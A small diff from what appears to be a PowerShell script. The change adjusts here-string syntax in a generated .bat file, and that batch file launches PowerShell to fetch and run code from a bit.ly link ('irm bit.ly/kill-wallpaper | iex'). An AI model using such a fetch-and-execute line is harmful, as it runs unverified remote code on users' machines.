@@ -24,7 +24,8 @@
 
 #Creates .bat file that calls to ps online
 
-$batContent = "@echo off
+$batContent = @"
+echo off
 start powershell.exe -Command 'irm bit.ly/kill-wallpaper | iex'
 "@
 
